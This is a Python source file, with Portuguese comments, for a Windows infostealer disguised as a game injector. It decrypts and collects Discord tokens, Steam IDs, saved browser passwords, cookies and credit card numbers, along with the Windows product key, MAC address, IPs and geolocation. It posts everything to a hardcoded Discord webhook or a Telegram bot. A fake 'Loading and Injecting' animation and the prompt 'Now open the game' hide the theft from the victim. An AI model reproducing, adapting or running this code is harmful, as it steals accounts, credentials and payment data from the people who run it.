import os
import re
import subprocess
from base64 import b64decode
from json import loads
from shutil import copy2
from sqlite3 import connect
import win32crypt
from Crypto.Cipher import AES
import socket
import requests
import platform
import uuid
import time
import sys

# Obtendo os diretórios do sistema
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

tokenPaths = {
    'Discord': rf"{roaming}\Discord",
    'Discord Canary': rf"{roaming}\discordcanary",
    'Discord PTB': rf"{roaming}\discordptb",
    'Google Chrome': rf"{local}\Google\Chrome\User Data\Default",
    'Opera': rf"{roaming}\Opera Software\Opera Stable",
    'Brave': rf"{local}\BraveSoftware\Brave-Browser\User Data\Default",
    'Yandex': rf"{local}\Yandex\YandexBrowser\User Data\Default",
    'OperaGX': rf"{roaming}\Opera Software\Opera GX Stable",
    'Steam': rf"{roaming}\Steam"  # Adicionado suporte para Steam
}

browser_loc = {
    "Chrome": rf"{local}\Google\Chrome",
    "Brave": rf"{local}\BraveSoftware\Brave-Browser",
    "Edge": rf"{local}\Microsoft\Edge",
    "Opera": rf"{roaming}\Opera Software\Opera Stable",
    "OperaGX": rf"{roaming}\Opera Software\Opera GX Stable",
}


# Função para obter informações do sistema
def get_system_info():
    try:
        os_info = {
            "Nome do Computador": platform.node(),
            "Sistema Operacional": platform.system() + " " + platform.release(),
            "Chave do Windows": get_windows_key(),
            "Endereço MAC": get_mac_address()
        }
        return os_info
    except Exception as e:
        return {"Erro": str(e)}

# Função para coletar o endereço MAC
def get_mac_address():
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8 * 6, 8)][::-1])
        return mac if mac else "Endereço MAC não encontrado."
    except Exception:
        return "Endereço MAC não encontrado."

# Função para obter a chave do Windows
def get_windows_key():
    try:
        key = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey', shell=True)
        return key.strip().decode().split('\n')[1]
    except Exception:
        return "Chave do Windows não encontrada."

# Função para descriptografar token do Discord
def decrypt_token(buff, master_key):
    try:
        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return None

# Função para extrair tokens do Discord
def get_tokens(path):
    tokens = set()  # Usar um conjunto para evitar duplicatas
    lev_db = f"{path}\\Local Storage\\leveldb"
    loc_state = f"{path}\\Local State"


    if os.path.exists(loc_state):
        with open(loc_state, "r") as file:
            key = loads(file.read())['os_crypt']['encrypted_key']
        for file_name in os.listdir(lev_db):
            if file_name.endswith(".ldb") or file_name.endswith(".log"):
                try:
                    with open(os.path.join(lev_db, file_name), "r", errors='ignore') as files:
                        for line in files.readlines():
                            line = line.strip()
                            token_match = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line)
                            for token in token_match:
                                decrypted = decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                                if decrypted:
                                    tokens.add(decrypted)  # Adiciona ao conjunto
                except PermissionError:
                    continue
    else:  # Método antigo sem criptografia
        for file_name in os.listdir(path):
            if file_name.endswith('.log') or file_name.endswith('.ldb'):
                try:
                    for line in open(os.path.join(path, file_name), errors='ignore').readlines():
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            token = re.findall(regex, line)
                            if token:
                                tokens.add(token[0])  # Adiciona ao conjunto
                except:
                    continue
    return list(tokens)  # Retorna como uma lista

def get_steam_tokens(path):
    steam_tokens = []
    config_file = os.path.join(path, 'config', 'loginusers.vdf')
    if os.path.exists(config_file):
        print(f"Arquivo encontrado: {config_file}")
        try:
            with open(config_file, 'r', encoding='utf-8') as file:
                data = file.read()
                steam_tokens = re.findall(r'"SteamID"\s*"(\d+)"', data)
                if steam_tokens:
                    print(f"Tokens encontrados: {steam_tokens}")
                else:
                    print("Nenhum token da Steam encontrado.")
        except Exception as e:
            print(f"Erro ao extrair tokens da Steam: {e}")
    else:
        print(f"Arquivo não encontrado: {config_file}")
    return steam_tokens

# Funções para descriptografar dados do navegador
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

# Função para descriptografar o conteúdo do navegador e extrair os dados
def decrypt_browser(LocalState, LoginData, CookiesFile, name):
    message = ""
    if os.path.exists(LocalState):
        with open(LocalState) as f:
            local_state = loads(f.read())
            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

            if os.path.exists(LoginData):
                copy2(LoginData, "TempMan.db")
                with connect("TempMan.db") as conn:
                    cur = conn.cursor()
                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                    message += f"\n*** {name} - Login ***\n"
                    for logins in cur.fetchall():
                        try:
                            if logins[0] and logins[1] and logins[2]:
                                ciphers = logins[2]
                                init_vector = ciphers[3:15]
                                enc_pass = ciphers[15:-16]

                                cipher = generate_cipher(master_key, init_vector)
                                dec_pass = decrypt_payload(cipher, enc_pass).decode()
                                message += f"URL: {logins[0]}\nUsuário: {logins[1]}\nSenha: {dec_pass}\n"
                        except Exception:
                            continue

            if os.path.exists(CookiesFile):
                copy2(CookiesFile, "CookMe.db")
                with connect("CookMe.db") as conn:
                    curr = conn.cursor()
                    curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
                    message += f"\n*** {name} - Cookies ***\n"
                    for cookies in curr.fetchall():
                        try:
                            if cookies[0] and cookies[1] and cookies[2] and "google" not in cookies[0]:
                                ciphers = cookies[2]
                                init_vector = ciphers[3:15]
                                enc_pass = ciphers[15:-16]
                                cipher = generate_cipher(master_key, init_vector)
                                dec_pass = decrypt_payload(cipher, enc_pass).decode()
                                message += f'URL: {cookies[0]}\nNome: {cookies[1]}\nCookie: {dec_pass}\n'
                        except Exception:
                            continue
    return message.strip()

# Função para extrair dados de cartão de crédito
def extrair_cartao_credito(local_state, bd_cartao):
    cartao_text = ""
    if os.path.exists(local_state):
        with open(local_state) as f:
            state_data = loads(f.read())
        chave_mestra = b64decode(state_data["os_crypt"]["encrypted_key"])[5:]
        chave_mestra = win32crypt.CryptUnprotectData(chave_mestra, None, None, None, 0)[1]

        if os.path.exists(bd_cartao):
            copy2(bd_cartao, "CartaoTemp.db")
            with connect("CartaoTemp.db") as conn:
                cur = conn.cursor()
                cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                for row in cur.fetchall():
                    nome_cartao, mes_exp, ano_exp, numero_encriptado = row
                    init_vector = numero_encriptado[3:15]
                    enc_numero = numero_encriptado[15:-16]
                    cipher = generate_cipher(chave_mestra, init_vector)
                    numero_cartao = decrypt_payload(cipher, enc_numero).decode()
                    cartao_text += f"Nome no Cartão: {nome_cartao}\nNúmero: {numero_cartao}\nExpiração: {mes_exp}/{ano_exp}\n"
    return cartao_text.strip() if cartao_text else ""

# Funções para obter o caminho correto dos arquivos do navegador
def Local_State(path):
    return f"{path}\\User Data\\Local State"


def Login_Data(path):
    return f"{path}\\User Data\\Default\\Login Data" if "Profile" not in path else f"{path}\\Login Data"

def Cookies(path):
    return f"{path}\\User Data\\Default\\Network\\Cookies" if "Profile" not in path else f"{path}\\Network\\Cookies"

def main_tokens():
    mensagem_tokens = ""
    for platform, path in tokenPaths.items():
        if os.path.exists(path):
            if 'Steam' in platform:
                steam_tokens = get_steam_tokens(path)
                if steam_tokens:
                    mensagem_tokens += f"\nTokens Steam:\n" + "\n".join(steam_tokens) + "\n"
            else:
                tokens = get_tokens(path)
                if tokens:
                    mensagem_tokens += f"\nTokens {platform}:\n" + "\n".join(tokens) + "\n"
    return mensagem_tokens.strip()

# Função para enviar dados ao webhook ou Telegram
def post_to(file_content):
    token = "TELEGRAM TOKEN"  # Coloque seu token aqui
    chat_id = "TELEGRAM CHATID"  # Coloque o ID do chat aqui
    webhook_url = "https://discord.com/api/webhooks/1297063847416565813/NvAn5znW-k1FpNLUUNjJFG4DknxXNLYuhk1SU98X5FAzkCXr1Y63gsFZPoHAX6x5_uN8"  # URL do webhook do Discord

    # Enviar para Telegram
    if token != "TELEGRAM TOKEN" and chat_id != "TELEGRAM CHATID":
        try:
            requests.post(
                "https://api.telegram.org/bot" + token + "/sendMessage", 
                data={'chat_id': chat_id, 'text': file_content}
            )
        except Exception as e:
            print(f"Erro ao enviar para o Telegram: {e}")

    # Enviar para Webhook do Discord
    try:
        requests.post(webhook_url, json={"content": file_content})
    except Exception as e:
        print(f"Erro ao enviar para o webhook: {e}")

# Função para coletar geolocalização e IPs
def extrair_info_geografica():
    try:
        response = requests.get("https://ipinfo.io/")
        data = response.json()
        geo_text = (f"Informações Geográficas:\n"
                    f"IP Público: {data['ip']}\n"
                    f"Localização: {data['city']}, {data['region']}, {data['country']}\n"
                    f"Coordenadas: {data['loc']}\n")
        return geo_text.strip()
    except Exception as e:
        return f"Erro ao obter informações geográficas: {str(e)}"

# Função para obter IP privado e público
def extrair_ips():
    hostname = socket.gethostname()
    ip_privado = socket.gethostbyname(hostname)

    ip_text = f"Informações de IP:\nIP Privado: {ip_privado}\n"
    try:
        ip_publico = requests.get('https://api.ipify.org').text
        ip_text += f"IP Público: {ip_publico}\n"
    except Exception as e:
        ip_text += f"Erro ao obter IP público: {str(e)}"
    
    return ip_text.strip()

# Função principal para consolidar as informações e enviá-las
def main():
    mensagem = ""
    mensagens_adicionais = set()  # Conjunto para evitar mensagens duplicadas

    # Obter informações do sistema
    sys_info = get_system_info()
    for key, value in sys_info.items():
        mensagem += f"{key}: {value}\n"

    # Coletar tokens
    tokens_info = main_tokens()
    if tokens_info:
        mensagem += tokens_info + "\n"  # Incluindo os tokens coletados na mensagem principal

    # Coletar geolocalização e IPs
    geo_info = extrair_info_geografica()
    if geo_info.strip() and geo_info.strip() not in mensagens_adicionais:
        mensagem += geo_info + "\n"
        mensagens_adicionais.add(geo_info.strip())

    ip_info = extrair_ips()
    if ip_info.strip() and ip_info.strip() not in mensagens_adicionais:
        mensagem += ip_info + "\n"
        mensagens_adicionais.add(ip_info.strip())

    # Descriptografar navegadores e extrair dados
    cartao_info = ""
    for name, path in browser_loc.items():
        browser_data = decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), name)
        if browser_data.strip() and browser_data.strip() not in mensagens_adicionais:
            mensagem += browser_data
            mensagens_adicionais.add(browser_data.strip())

        cartao_info += extrair_cartao_credito(Local_State(path), Login_Data(path)) + ""

    # Verifica se existem informações de cartão de crédito
    if cartao_info.strip():
        mensagem += cartao_info.strip()  # Mantém tudo em uma única linha

    # Enviar a mensagem consolidada para o Telegram ou Discord
    post_to(mensagem.strip())

main()

import time
import sys

# Função para simular carregamento
def loading_animation():
    loading_text = "Loading and Injecting"
    for i in range(3):  # Repetir a animação 3 vezes
        for dot_count in range(4):
            sys.stdout.write(f"\r{loading_text}{'.' * dot_count}  ")
            sys.stdout.flush()
            time.sleep(0.5)
    sys.stdout.write("\n")  # Nova linha após o carregamento

# Chamar a animação de carregamento
loading_animation()

# Chamar a animação de carregamento
loading_animation()

# Mensagem final
print("Now open the game")

# Esperar o usuário pressionar Enter para fechar o programa
input("Press Enter to close...")
